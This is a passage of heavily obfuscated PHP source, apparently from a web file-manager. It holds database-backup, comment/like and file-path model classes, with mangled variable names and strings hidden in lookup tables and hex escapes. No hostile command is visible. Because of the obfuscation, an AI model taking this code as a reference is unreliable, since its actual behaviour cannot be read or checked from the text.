$ÍûÍ¨¢¶[868]; if ($öø¼’¦Ş == $ÍûÍ¨¢¶[862]) { @touch($ˆ“Š›½å); continue; } $ö˜èâíİ = null; if ($öø¼’¦Ş == $ÍûÍ¨¢¶[869] && $Â£ƒÕñ‹[$ÍûÍ¨¢¶[171]] == $ÍûÍ¨¢¶[854]) { $ö˜èâíİ = self::$io; } $ä¹ÚÃÈ˜ += $¡Ïú´Ø->sqlFromDb($öø¼’¦Ş, $ˆ“Š›½å, $—éŠğó—, $ö˜èâíİ); } unset($GLOBALS[$ÍûÍ¨¢¶[867]]); $—éŠğó—->end(); if ($ä¹ÚÃÈ˜ > $µ€§ÑĞ) { $µ€§ÑĞ = $ä¹ÚÃÈ˜; } $î›ıëµÚ = array($ÍûÍ¨¢¶[856] => $ÅÁ£Û§„, $ÍûÍ¨¢¶[851] => 1, $ÍûÍ¨¢¶[870] => $µ€§ÑĞ, $ÍûÍ¨¢¶[871] => $ä¹ÚÃÈ˜, $ÍûÍ¨¢¶[872] => time()); Backup::set($î›ıëµÚ); if ($µ€§ÑĞ - $ä¹ÚÃÈ˜ > 0) { $“ºĞ§Œ = $ÍûÍ¨¢¶[873]; if (!stristr(I18n::getType(), $ÍûÍ¨¢¶[874])) { $“ºĞ§Œ = $ÍûÍ¨¢¶[875]; } Backup::log(array($“ºĞ§Œ, $î›ıëµÚ)); return !1; } return !0; } private function tmpFilesPath() { $ßĞÇ†éÔ =& $_SERVER[ùèÅ´Ãš]; $«Ù€Çß = TEMP_FILES; if ($GLOBALS[$ßĞÇ†éÔ[6]][$ßĞÇ†éÔ[92]][$ßĞÇ†éÔ[876]]) { $«Ù€Çß = $GLOBALS[$ßĞÇ†éÔ[6]][$ßĞÇ†éÔ[92]][$ßĞÇ†éÔ[876]]; if (!mk_dir($«Ù€Çß) || !is_writable($«Ù€Çß) || !IO::mkfile($«Ù€Çß . $ßĞÇ†éÔ[877])) { $«Ù€Çß = TEMP_FILES; } } return $«Ù€Çß; } } class BackupDbFile { public function __construct() { } public function index() { $ô³ÑÆëÀ =& $_SERVER[ùèÅ´Ãš]; $ ö£ç½Ò = Backup::get(); $“ªÕÈ«ì = $ ö£ç½Ò[$ô³ÑÆëÀ[32]]; $ıÆ„Í×è = $this->tmpFilesPath() . "\142\x61\143\x6b\165\x70\x5f{$“ªÕÈ«ì}\57"; $àùİÑôó = $this->backupPath($ ö£ç½Ò); if (!($àùİÑôó = IO::mkdir($àùİÑôó))) { Backup::log($ô³ÑÆëÀ[878] . $àùİÑôó); return !1; } $ôËÎ¬Í = IO::listPath($ıÆ„Í×è); $ªÚÛĞŸ¯ = isset($ôËÎ¬Í[$ô³ÑÆëÀ[86]]) ? $ôËÎ¬Í[$ô³ÑÆëÀ[86]] : array(); $‹ŠÓ­üù = array_sum(array_column($ªÚÛĞŸ¯, $ô³ÑÆëÀ[79])); if (!$‹ŠÓ­üù) { Backup::log($ô³ÑÆëÀ[879] . $ıÆ„Í×è); return !1; } $«Öé¬ß = array($ô³ÑÆëÀ[880] => $‹ŠÓ­üù, $ô³ÑÆëÀ[881] => time()); Backup::set($«Öé¬ß); $İ¥”ª¼ = new TaskFileTransfer($ô³ÑÆëÀ[882], $ô³ÑÆëÀ[855], count($ªÚÛĞŸ¯), LNG($ô³ÑÆëÀ[864]) . $ô³ÑÆëÀ[464] . LNG($ô³ÑÆëÀ[866]) . $ô³ÑÆëÀ[883]); $İ¥”ª¼->task[$ô³ÑÆëÀ[841]] = $‹ŠÓ­üù; foreach ($ôËÎ¬Í[$ô³ÑÆëÀ[86]] as $¿²œÂÀî) { $Êæ›Ïİ‹ = IO::move($¿²œÂÀî[$ô³ÑÆëÀ[87]], $àùİÑôó); if (!$Êæ›Ïİ‹) { $İ¥”ª¼->end(); $¥œì€”Î = IO::getLastError($ô³ÑÆëÀ[884] . $¿²œÂÀî[$ô³ÑÆëÀ[87]] . $ô³ÑÆëÀ[885] . $àùİÑôó . $ô³ÑÆëÀ[178]); Backup::log($¥œì€”Î); return !1; } } $à£ıÊŒá = new DbManage(); $üÄ»×ŒÕ = $à£ıÊŒá->getSqlFile(); if (!$üÄ»×ŒÕ || !$üÄ»×ŒÕ[$ô³ÑÆëÀ[886]] || !$üÄ»×ŒÕ[$ô³ÑÆëÀ[13]]) { Backup::log($ô³ÑÆëÀ[887]); return !1; } IO::move($üÄ»×ŒÕ[$ô³ÑÆëÀ[886]], $àùİÑôó); IO::move($üÄ»×ŒÕ[$ô³ÑÆëÀ[13]], $àùİÑôó); $İ¥”ª¼->end(); $«Öé¬ß = array($ô³ÑÆëÀ[888] => $‹ŠÓ­üù, $ô³ÑÆëÀ[889] => time()); Backup::set($«Öé¬ß); return !0; } private function backupPath($¶Ü‚¦ƒ¼) { $ò¥Ë‹» =& $_SERVER[ùèÅ´Ãš]; $¯şÍ£ƒ´ = $¶Ü‚¦ƒ¼[$ò¥Ë‹»[32]]; $²µÊ…´â = Model($ò¥Ë‹»[848])->get($ò¥Ë‹»[849]); $¥ŒÚ©ü˜ = substr(md5($ò¥Ë‹»[850] . $²µÊ…´â . $¯şÍ£ƒ´), 0, 8); return "\x7b\x69\157\72{$¶Ü‚¦ƒ¼[$ò¥Ë‹»[829]]}\x7d\x2f\144\x61\x74\x61\x62\141\x73\x65\x2f\142\141\x63\x6b\165\160\57" . $¯şÍ£ƒ´ . $ò¥Ë‹»[11] . $¥ŒÚ©ü˜; } private function tmpFilesPath() { $¤ÎÛú½â =& $_SERVER[ùèÅ´Ãš]; $’ø¯Òã = TEMP_FILES; if ($GLOBALS[$¤ÎÛú½â[6]][$¤ÎÛú½â[92]][$¤ÎÛú½â[876]]) { $’ø¯Òã = $GLOBALS[$¤ÎÛú½â[6]][$¤ÎÛú½â[92]][$¤ÎÛú½â[876]]; if (!mk_dir($’ø¯Òã) || !is_writable($’ø¯Òã) || !IO::mkfile($’ø¯Òã . $¤ÎÛú½â[877])) { $’ø¯Òã = TEMP_FILES; } } return $’ø¯Òã; } } goto b˜‹Î½‰‹; e†õä¾›„Ú: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\x6d\x65" => "\143\x6f\x6d\x6d\x65\x6e\164\137\155\145\164\141", "\155\x65\x74\x61\x46\x69\145\154\x64" => "\x63\x6f\x6d\155\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Å©Œ£ùŠ) { $ÌÜ¾ò¨¾ =& $_SERVER[ùèÅ´Ãš]; if ($Å©Œ£ùŠ[$ÌÜ¾ò¨¾[2026]]) { $êà¢ÈÊÂ = $this->where(array($ÌÜ¾ò¨¾[2027] => $Å©Œ£ùŠ[$ÌÜ¾ò¨¾[2026]]))->find(); if (!$êà¢ÈÊÂ || $êà¢ÈÊÂ[$ÌÜ¾ò¨¾[191]] != $Å©Œ£ùŠ[$ÌÜ¾ò¨¾[191]] || $êà¢ÈÊÂ[$ÌÜ¾ò¨¾[573]] != $Å©Œ£ùŠ[$ÌÜ¾ò¨¾[573]]) { return !1; } $this->where(array($ÌÜ¾ò¨¾[2027] => $Å©Œ£ùŠ[$ÌÜ¾ò¨¾[2026]]))->setAdd($ÌÜ¾ò¨¾[2028], 1); } $Å©Œ£ùŠ[$ÌÜ¾ò¨¾[2029]] = 0; $Å©Œ£ùŠ[$ÌÜ¾ò¨¾[2028]] = 0; $Å©Œ£ùŠ[$ÌÜ¾ò¨¾[827]] = 1; return $this->add($Å©Œ£ùŠ); } public function commentCount($òˆÆë«, $õÎŠÀùô, $ç‰‘–Âé = false) { $•À’Æ™ =& $_SERVER[ùèÅ´Ãš]; if (!$òˆÆë«) { return array(); } if (is_string($òˆÆë«) || is_int($òˆÆë«)) { $òˆÆë« = array($òˆÆë«); } $Ó×´¥Úô = array($•À’Æ™[573], $•À’Æ™[2030] => $•À’Æ™[569]); $ç¢‘àğ‚ = array($•À’Æ™[573] => array($•À’Æ™[7], $òˆÆë«), $•À’Æ™[191] => $õÎŠÀùô); if ($ç‰‘–Âé) { $ç¢‘àğ‚[$•À’Æ™[1797]] = $ç‰‘–Âé; } $Û©¼¯Ö£ = $this->field($Ó×´¥Úô)->where($ç¢‘àğ‚)->group($•À’Æ™[573])->select(); return array_to_keyvalue($Û©¼¯Ö£, $•À’Æ™[573], $•À’Æ™[569]); } public function starTarget($ï’ÈÌğÖ, $·ÒĞ„å´) { $‘Ø“ÛéÖ =& $_SERVER[ùèÅ´Ãš]; $«ç¼üû„ = $ï’ÈÌğÖ + self::TYPE_STAR_OFFSET; $¯±ù‰À¯ = array($‘Ø“ÛéÖ[1797] => USER_ID, $‘Ø“ÛéÖ[191] => $«ç¼üû„, $‘Ø“ÛéÖ[573] => $·ÒĞ„å´); $½ß¿Ší = $this->where($¯±ù‰À¯)->find(); if ($½ß¿Ší) { return $this->where(array($‘Ø“ÛéÖ[477] => $½ß¿Ší[$‘Ø“ÛéÖ[477]]))->delete(); } $ ÛÄÅË = array($‘Ø“ÛéÖ[2026] => 0, $‘Ø“ÛéÖ[1797] => USER_ID, $‘Ø“ÛéÖ[827] => 1, $‘Ø“ÛéÖ[171] => $‘Ø“ÛéÖ[12], $‘Ø“ÛéÖ[191] => $«ç¼üû„, $‘Ø“ÛéÖ[573] => $·ÒĞ„å´, $‘Ø“ÛéÖ[2029] => 0, $‘Ø“ÛéÖ[2028] => 0); return $this->add($ ÛÄÅË); } public function starTargetCount($Â¶´à¿, $¦ú¤ÎâÜ) { $ÕÁ¸ãçÕ =& $_SERVER[ùèÅ´Ãš]; $ÛöÓ³˜ = $¦ú¤ÎâÜ + self::TYPE_STAR_OFFSET; $É­­¨äØ = $this->commentCount($Â¶´à¿, $ÛöÓ³˜); $™—ë»“í = $this->commentCount($Â¶´à¿, $ÛöÓ³˜, USER_ID); return array($ÕÁ¸ãçÕ[2031] => $É­­¨äØ, $ÕÁ¸ãçÕ[2032] => $™—ë»“í); } public function starTargetUserList($û„„£Ô¨, $¦²–†ş–) { $î×Ê´ô =& $_SERVER[ùèÅ´Ãš]; $×À˜À ½ = $û„„£Ô¨ + self::TYPE_STAR_OFFSET; $É×ºûç¥ = array($î×Ê´ô[573] => $¦²–†ş–, $î×Ê´ô[191] => $×À˜À ½); $¨ò…”‡¢ = $this->where($É×ºûç¥)->count(); $Âñä§¹” = array($î×Ê´ô[335] => $¨ò…”‡¢, $î×Ê´ô[2033] => array()); if (!$¨ò…”‡¢) { return $Âñä§¹”; } $ªâÁ¿ç° = $this->field($î×Ê´ô[1797])->where($É×ºûç¥)->limit(500)->select(); $ªâÁ¿ç° = array_to_keyvalue($ªâÁ¿ç°, $î×Ê´ô[12], $î×Ê´ô[1797]); $Âñä§¹”[$î×Ê´ô[2033]] = Model($î×Ê´ô[581])->userListInfo($ªâÁ¿ç°); return $Âñä§¹”; } public function prasiseUserList($šª®é) { $ÎÈ£ù± =& $_SERVER[ùèÅ´Ãš]; $êøœËÊ· = array($ÎÈ£ù±[2034] => $šª®é); $É¬Í´úö = $this->where($êøœËÊ·)->find(); $†˜Áı«´ = _get($É¬Í´úö, $ÎÈ£ù±[2029], 0); $ºıÓş½ç = array($ÎÈ£ù±[335] => $†˜Áı«´, $ÎÈ£ù±[2033] => array()); if (!$†˜Áı«´) { return $ºıÓş½ç; } $¤øšæ–Õ = Model($ÎÈ£ù±[2035])->field($ÎÈ£ù±[1797])->where($êøœËÊ·)->limit(500)->select(); $¤øšæ–Õ = array_to_keyvalue($¤øšæ–Õ, $ÎÈ£ù±[12], $ÎÈ£ù±[1797]); $ºıÓş½ç[$ÎÈ£ù±[2033]] = Model($ÎÈ£ù±[581])->userListInfo($¤øšæ–Õ); return $ºıÓş½ç; } public function remove($İ™ĞŞË) { $±¨ø÷Â =& $_SERVER[ùèÅ´Ãš]; $«Æõí‹ò = array($±¨ø÷Â[2027] => $İ™ĞŞË); $®–è•Ì = $this->where($«Æõí‹ò)->find(); if ($®–è•Ì[$±¨ø÷Â[2026]]) { $this->where(array($±¨ø÷Â[2027] => $®–è•Ì[$±¨ø÷Â[2026]]))->setAdd($±¨ø÷Â[2028], -1); } return $this->removeArray($İ™ĞŞË); } public function edit($ôíâÆ­­, $œÛ¿ˆ‘Î) { $ğ…¯ò´ =& $_SERVER[ùèÅ´Ãš]; $ƒ—ÆŞûç = array($ğ…¯ò´[2027] => $ôíâÆ­­); return $this->where($ƒ—ÆŞûç)->save(array($ğ…¯ò´[2036] => $œÛ¿ˆ‘Î)); } public function prasise($áÜ¬ÊÙÜ) { $‚ØÜö—½ =& $_SERVER[ùèÅ´Ãš]; $Œ“¬Âµ = Model($‚ØÜö—½[2037]); $¡­÷Â– = array($‚ØÜö—½[2027] => $áÜ¬ÊÙÜ, $‚ØÜö—½[1788] => USER_ID); $’Ï°’· = $Œ“¬Âµ->where($¡­÷Â–)->find(); if (!$’Ï°’·) { $Œ“¬Âµ->add($¡­÷Â–); $“ß›©Ğ™ = $this->where(array($‚ØÜö—½[2027] => $áÜ¬ÊÙÜ))->setAdd($‚ØÜö—½[2029], 1); } else { $Œ“¬Âµ->where($¡­÷Â–)->delete(); $“ß›©Ğ™ = $this->where(array($‚ØÜö—½[2027] => $áÜ¬ÊÙÜ))->setAdd($‚ØÜö—½[2029], -1); } return $“ß›©Ğ™; } public function targetInfo($åŒÉŒ‘ğ, $ÅçÓ—Ò) { $·Ğ÷²Úô =& $_SERVER[ùèÅ´Ãš]; $àŞí‘ = array($·Ğ÷²Úô[655] => $åŒÉŒ‘ğ, $·Ğ÷²Úô[656] => $ÅçÓ—Ò); $Íè¤¼ğÓ = $this->where($àŞí‘)->count(); $¨ˆ•Á…ğ = "\x52\x49\x47\x48\x54\x20\112\117\111\x4e\40{$this->tablePrefix}\143\157\155\155\145\156\164\x5f\x70\x72\141\151\x73\x65\x20\163\164\x61\162\x20\x6f\x6e\x20\143\x6f\x6d\155\145\156\164\x2e\143\157\155\x6d\x65\156\x74\111\x44\x20\75\40\x73\x74\x61\x72\x2e\143\x6f\x6d\x6d\x65\156\164\111\x44"; $ööè¼¿– = $this->alias($·Ğ÷²Úô[431])->where($àŞí‘)->join($¨ˆ•Á…ğ, $·Ğ÷²Úô[2038])->count(); $˜ØÙÙİ = array($·Ğ÷²Úô[2039] => $Íè¤¼ğÓ, $·Ğ÷²Úô[2040] => $ööè¼¿–); return $˜ØÙÙİ; } public function listData($ºæÈøŸ) { $õîâ‚– =& $_SERVER[ùèÅ´Ãš]; if (isset($ºæÈøŸ[$õîâ‚–[2041]])) { if ($ºæÈøŸ[$õîâ‚–[2041]]) { $ºæÈøŸ[$õîâ‚–[2034]] = array($õîâ‚–[1102], intval($ºæÈøŸ[$õîâ‚–[2041]])); } unset($ºæÈøŸ[$õîâ‚–[2041]]); } if (isset($ºæÈøŸ[$õîâ‚–[2042]])) { if ($ºæÈøŸ[$õîâ‚–[2042]]) { $ºæÈøŸ[$õîâ‚–[2034]] = array($õîâ‚–[1099], intval($ºæÈøŸ[$õîâ‚–[2042]])); } unset($ºæÈøŸ[$õîâ‚–[2042]]); } return $this->_listData($ºæÈøŸ); } private function _listData($²½Ñ©Çä) { $ÃÓš Ûº =& $_SERVER[ùèÅ´Ãš]; $˜ÕË¡±Å = $this->where($²½Ñ©Çä)->_makeOrder()->selectPage(100); $this->_listAppendParent($˜ÕË¡±Å[$ÃÓš Ûº[447]]); $this->_listAppendUser($˜ÕË¡±Å[$ÃÓš Ûº[447]]); $this->_listAppendMeta($˜ÕË¡±Å[$ÃÓš Ûº[447]]); return $˜ÕË¡±Å; } private function _makeOrder() { $ÚÆª±“ó =& $_SERVER[ùèÅ´Ãš]; $£Â§‹« = array($ÚÆª±“ó[2029], $ÚÆª±“ó[2028], $ÚÆª±“ó[234]); $»‰ÀŒ¾³ = Input::get($ÚÆª±“ó[532], $ÚÆª±“ó[7], $ÚÆª±“ó[499], $£Â§‹«); $££ìÇáë = Input::get($ÚÆª±“ó[533], $ÚÆª±“ó[7], $ÚÆª±“ó[1790], array($ÚÆª±“ó[2043], $ÚÆª±“ó[528])); $®ú£¬ÔÇ = $»‰ÀŒ¾³ . $ÚÆª±“ó[53] . $££ìÇáë; return $this->order($®ú£¬ÔÇ); } private function _listAppendParent(&$§ùË‡…ƒ) { $À®üè‚ª =& $_SERVER[ùèÅ´Ãš]; $„ìÂòğœ = array_unique(array_to_keyvalue($§ùË‡…ƒ, $À®üè‚ª[12], $À®üè‚ª[2026])); $„ìÂòğœ = array_remove_value($„ìÂòğœ, $À®üè‚ª[231]); if (!$„ìÂòğœ) { return; } $Óñ°ÇÏò = $this->where(array($À®üè‚ª[2027] => array($À®üè‚ª[7], $„ìÂòğœ)))->select(); $Óñ°ÇÏò = array_to_keyvalue($Óñ°ÇÏò, $À®üè‚ª[2034]); foreach ($§ùË‡…ƒ as &$øÂÍÌŒ©) { if (isset($Óñ°ÇÏò[$øÂÍÌŒ©[$À®üè‚ª[2026]]])) { $øÂÍÌŒ©[$À®üè‚ª[2044]] = $Óñ°ÇÏò[$øÂÍÌŒ©[$À®üè‚ª[2026]]]; } } unset($øÂÍÌŒ©); } private function _listAppendUser(&$½–ùü¸‰) { $Ê£âÒÃÄ =& $_SERVER[ùèÅ´Ãš]; $¤ó àÖ• = array_unique(array_to_keyvalue($½–ùü¸‰, $Ê£âÒÃÄ[12], $Ê£âÒÃÄ[1797])); $¤ó àÖ• = array_remove_value($¤ó àÖ•, $Ê£âÒÃÄ[231]); if (count($¤ó àÖ•) == 0) { return; } foreach ($½–ùü¸‰ as $¤ØŸ‹¥î) { if (isset($¤ØŸ‹¥î[$Ê£âÒÃÄ[2044]])) { $¤ó àÖ•[] = $¤ØŸ‹¥î[$Ê£âÒÃÄ[2044]][$Ê£âÒÃÄ[1797]]; } } $èÉ³¥Š = Model($Ê£âÒÃÄ[601])->userListInfo($¤ó àÖ•); foreach ($½–ùü¸‰ as &$¤ØŸ‹¥î) { $¤ØŸ‹¥î[$Ê£âÒÃÄ[669]] = $èÉ³¥Š[$¤ØŸ‹¥î[$Ê£âÒÃÄ[1797]]]; if (isset($¤ØŸ‹¥î[$Ê£âÒÃÄ[2044]])) { $¤ØŸ‹¥î[$Ê£âÒÃÄ[2044]][$Ê£âÒÃÄ[669]] = $èÉ³¥Š[$¤ØŸ‹¥î[$Ê£âÒÃÄ[2044]][$Ê£âÒÃÄ[1797]]]; } } unset($¤ØŸ‹¥î); } private function _listAppendMeta(&$÷Ò±¢»Á) { $îÂ¹ï¥‘ =& $_SERVER[ùèÅ´Ãš]; $Ş±¨´ = array_unique(array_to_keyvalue($÷Ò±¢»Á, $îÂ¹ï¥‘[12], $îÂ¹ï¥‘[2034])); $Ş±¨´ = array_remove_value($Ş±¨´, $îÂ¹ï¥‘[231]); if (!$Ş±¨´) { return; } foreach ($÷Ò±¢»Á as $úòéÄ¤†) { if (isset($úòéÄ¤†[$îÂ¹ï¥‘[2044]])) { $Ş±¨´[] = $úòéÄ¤†[$îÂ¹ï¥‘[2044]][$îÂ¹ï¥‘[2034]]; } } $‘Í§øè = $this->metaList($Ş±¨´); if (!$‘Í§øè) { return !1; } foreach ($÷Ò±¢»Á as &$úòéÄ¤†) { $úòéÄ¤†[$îÂ¹ï¥‘[543]] = $‘Í§øè[$úòéÄ¤†[$îÂ¹ï¥‘[2034]]]; if (isset($úòéÄ¤†[$îÂ¹ï¥‘[2044]])) { $úòéÄ¤†[$îÂ¹ï¥‘[2044]][$îÂ¹ï¥‘[543]] = $‘Í§øè[$úòéÄ¤†[$îÂ¹ï¥‘[2044]][$îÂ¹ï¥‘[2034]]]; } } unset($úòéÄ¤†); } private function metaList($å‹îÁïÃ) { $´ĞòÄ‘‹ =& $_SERVER[ùèÅ´Ãš]; if (!$å‹îÁïÃ) { return array(); } $êÑ©Óœ£ = array($´ĞòÄ‘‹[2034] => array($´ĞòÄ‘‹[7], $å‹îÁïÃ)); $½éºíşÊ = Model($´ĞòÄ‘‹[2045])->where($êÑ©Óœ£)->select(); $½éºíşÊ = array_to_keyvalue_group($½éºíşÊ, $´ĞòÄ‘‹[2034]); foreach ($½éºíşÊ as $¼©ÜÈôş => $Ø½®¹È’) { $¬¿ñ¦åˆ = array(); foreach ($Ø½®¹È’ as $†Ñç“’) { $¬¿ñ¦åˆ[$†Ñç“’[$´ĞòÄ‘‹[97]]] = $†Ñç“’[$´ĞòÄ‘‹[452]]; } $½éºíşÊ[$¼©ÜÈôş] = $¬¿ñ¦åˆ; } return $½éºíşÊ ? $½éºíşÊ : array(); } public function removeTarget($Éû”¾…´, $Öóíƒ¤Ô) { $°–˜‚ÕÂ =& $_SERVER[ùèÅ´Ãš]; if (!$Öóíƒ¤Ô) { return !0; } $Öóíƒ¤Ô = is_array($Öóíƒ¤Ô) ? $Öóíƒ¤Ô : array($Öóíƒ¤Ô); $„§÷´´ï = array($°–˜‚ÕÂ[191] => $Éû”¾…´, $°–˜‚ÕÂ[573] => array($°–˜‚ÕÂ[7], $Öóíƒ¤Ô)); $†Ş¢œ¿ş = $this->field($°–˜‚ÕÂ[2034])->where($„§÷´´ï)->select(); $†€Ì±´½ = array_to_keyvalue($†Ş¢œ¿ş, $°–˜‚ÕÂ[12], $°–˜‚ÕÂ[2034]); return $this->removeArray($†€Ì±´½); } public function removeArray($¹¢çÃÌ) { $¢ƒ’¯¦¶ =& $_SERVER[ùèÅ´Ãš]; if (!$¹¢çÃÌ) { return !0; } $¹¢çÃÌ = is_array($¹¢çÃÌ) ? $¹¢çÃÌ : array($¹¢çÃÌ); $éÜèÙç = array($¢ƒ’¯¦¶[2034] => array($¢ƒ’¯¦¶[7], $¹¢çÃÌ)); Model($¢ƒ’¯¦¶[2037])->where($éÜèÙç)->delete(); Model($¢ƒ’¯¦¶[2046])->where($éÜèÙç)->delete(); return $this->where($éÜèÙç)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\154\145\137\143\x6f\x6e\x74\145\156\x74\163"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\124\x69\x6d\145", "\164\151\x6d\145", "\151\156\163\145\162\164", "\146\x75\x6e\x63\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\154\x65"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\145" => "\151\157\x5f\x66\x69\154\145\137\155\x65\164\141", "\155\145\164\x61\106\x69\x65\x6c\x64" => "\146\151\x6c\x65\x49\104"); public function fileInfo($àŒ’°İ¢) { $ôçÌ¼æÈ =& $_SERVER[ùèÅ´Ãš]; static $¼õ‘ÂŠ = array(); if (!isset($¼õ‘ÂŠ[$àŒ’°İ¢])) { $™Ô®ŒÙ = $ôçÌ¼æÈ[2047]; $·á²àıˆ = Model($ôçÌ¼æÈ[548])->field($™Ô®ŒÙ)->where(array($ôçÌ¼æÈ[546] => $àŒ’°İ¢))->find(); $¼õ‘ÂŠ[$àŒ’°İ¢] = $·á²àıˆ; } return $¼õ‘ÂŠ[$àŒ’°İ¢]; } public function addFileByContent($ê¹¹¦Œî = '', $Àøíº—­, $ğêâ„˜ = '') { $–İ³Ú±‚ =& $_SERVER[ùèÅ´Ãš]; $ÅíÛ÷ùí = TEMP_PATH . $–İ³Ú±‚[2048]; if (!is_dir($ÅíÛ÷ùí)) { mk_dir($ÅíÛ÷ùí); } $Òª¹ƒ¡Ã = $ÅíÛ÷ùí . $–İ³Ú±‚[2049] . rand_string(16); $ë«šêô¥ = file_put_contents($Òª¹ƒ¡Ã, $ê¹¹¦Œî); if ($ë«šêô¥ === !1 || strlen($ê¹¹¦Œî) != $ë«šêô¥) { return !1; } $µ‘ÛŸÂ¨ = $this->addFile($Òª¹ƒ¡Ã, $Àøíº—­, $ğêâ„˜, !0); if (file_exists($Òª¹ƒ¡Ã)) { @unlink($Òª¹ƒ¡Ã); } return $µ‘ÛŸÂ¨; } public function createFileName($ò«ºıŞŸ, $Ô“Ì‘‹º, $ÆÅğ–Ö = false, $Œ…‚”ú = false) { $—‚Š»Ñ =& $_SERVER[ùèÅ´Ãš]; $×Ôæ¥øƒ = IO::init($—‚Š»Ñ[8]); $ÇÓ¥ùÌß = $this->_makeFilePath($ò«ºıŞŸ, $Ô“Ì‘‹º, $×Ôæ¥øƒ, $ÆÅğ–Ö, $Œ…‚”ú); $³‹îóë¯ = $×Ôæ¥øƒ->pathFather($ÇÓ¥ùÌß); static $Ç”àÆÖÀ = false; $ì¬»€Ûì = $—‚Š»Ñ[2050] . md5($³‹îóë¯); if (!$Ç”àÆÖÀ && !Cache::get($ì¬»€Ûì)) { $Ç”àÆÖÀ = !0; $â¶¼›’½ = IO::mkdir($³‹îóë¯); if (!IO::exist($â¶¼›’½ . $—‚Š»Ñ[877])) { IO::mkfile($â¶¼›’½ . $—‚Š»Ñ[877]); } Cache::set($ì¬»€Ûì, 1, 3600 * 2); } return $ÇÓ¥ùÌß; } public function _makeFilePath($«¡õÃ°Â, $í¹ûì¦, $É«æÃ¯ğ, $Ú”àŞ˜ = false, $ôÉ´¿ÜÆ = false) { $§İœ¯¾ =& $_SERVER[ùèÅ´Ãš]; $äÁ‘ÕÓË = Model($§İœ¯¾[848])->get($§İœ¯¾[2051]); $Íî‰ú’ = $§İœ¯¾[1336] . $í¹ûì¦[$§İœ¯¾[477]] . $§İœ¯¾[486] . date($§İœ¯¾[2052]); $ÚÙ„ƒÁ± = $Íî‰ú’ . rand_string(5) . short_id(100); $«¡õÃ°Â = str_replace($§İœ¯¾[8], $§İœ¯¾[11], KodIO::clear($«¡õÃ°Â)); $ü—±„óù = $É«æÃ¯ğ->ext($«¡õÃ°Â); if (!$«¡õÃ°Â) { $äÁ‘ÕÓË = $§İœ¯¾[854]; } switch ($äÁ‘ÕÓË) { case $§İœ¯¾[2053]: if ($ü—±„óù) { $ÚÙ„ƒÁ± = $ÚÙ„ƒÁ± . $§İœ¯¾[10] . $ü—±„óù; } if ($ü—±„óù == $§İœ¯¾[1990]) { $ÚÙ„ƒÁ± .= $§İœ¯¾[1305]; } break; case $§İœ¯¾[2054]: $şÒËíÃè = Model($§İœ¯¾[848])->get($§İœ¯¾[849]); $²‚Í··¨ = substr(md5($§İœ¯¾[850] . $şÒËíÃè . date($§İœ¯¾[826])), 0, 8); $Íî‰ú’ = $§İœ¯¾[1336] . $í¹ûì¦[$§İœ¯¾[477]] . $§İœ¯¾[486] . date($§İœ¯¾[2055]) . $²‚Í··¨ . $§İœ¯¾[8]; if ($ü—±„óù == $§İœ¯¾[1990]) { $«¡õÃ°Â .= $§İœ¯¾[1305]; } $ÓğŞüÃÚ = $§İœ¯¾[2056] . $Íî‰ú’ . $«¡õÃ°Â; CacheLock::lock($ÓğŞüÃÚ); $ÚÙ„ƒÁ± = $Íî‰ú’ . $«¡õÃ°Â; if (IO::exist($Íî‰ú’ . $«¡õÃ°Â)) { $Ú™ŞæÈŠ = substr($«¡õÃ°Â, 0, strlen($«¡õÃ°Â) - strlen($ü—±„óù)); $óò¸¡ì÷ = $ôÉ´¿ÜÆ ? substr($ôÉ´¿ÜÆ, 0, 5) : ($Ú”àŞ˜ ? substr($Ú”àŞ˜, 0, 5) : rand_string(5)); $ÚÙ„ƒÁ± = $Íî‰ú’ . $Ú™ŞæÈŠ . $óò¸¡ì÷; if ($ü—±„óù) { $ÚÙ„ƒÁ± = $ÚÙ„ƒÁ± . $§İœ¯¾[10] . $ü—±„óù; } } if (IO::isOsDriver($ÚÙ„ƒÁ±) && !IO::isUploadServer($ÚÙ„ƒÁ±)) { if (IO::exist($ÚÙ„ƒÁ±)) { CacheLock::unlock($ÓğŞüÃÚ); return $ÚÙ„ƒÁ±; } $úÇ¸ÀÃ  = IO::setContent($ÚÙ„ƒÁ±, $§İœ¯¾[12]); if (!$úÇ¸ÀÃ ) { show_json($§İœ¯¾[2057], !1); } } CacheLock::unlock($ÓğŞüÃÚ); break; case $§İœ¯¾[854]: break; default: break; } return $ÚÙ„ƒÁ±; } public function addFileByRemote($ìÃ€äÕê, $À‹Œªğ€, $±À¶è“” = array()) { $Ê³“® =& $_SERVER[ùèÅ´Ãš]; if (!IO::isFile($ìÃ€äÕê)) { return !1; } $Ëş®ƒ£à = $±À¶è“”[$Ê³“®[551]] ? $±À¶è“”[$Ê³“®[551]] : $Ê³“®[12]; $ôµø•¢ = IO::hashMd5($ìÃ€äÕê, $Ëş®ƒ£à); $ÎÊìó¡« = KodIO::parse($ìÃ€äÕê); $¶„†Óüî = array($Ê³“®[624] => IO::size($ìÃ€äÕê), $Ê³“®[2058] => 1, $Ê³“®[496] => $À‹Œªğ€, $Ê³“®[891] => $ÎÊìó¡«[$Ê³“®[477]], $Ê³“®[497] => $ìÃ€äÕê, $Ê³“®[2059] => $±À¶è“”[$Ê³“®[679]] ? $±À¶è“”[$Ê³“®[679]] : IO::hashSimple($ìÃ€äÕê), $Ê³“®[2060] => $ôµø•¢ ? $ôµø•¢ : $Ëş®ƒ£à); if ($¿¬Ìéìï = $this->addFileCheckExist($¶„†Óüî[$Ê³“®[679]], $¶„†Óüî[$Ê³“®[551]], $¶„†Óüî[$Ê³“®[79]])) { return $¿¬Ìéìï; } return $this->addFileData($¶„†Óüî); } private function addFileData($÷Öû¦‡) { $—ÕïĞÊ¸ =& $_SERVER[ùèÅ´Ãš]; if (!$÷Öû¦‡) { return !1; } if 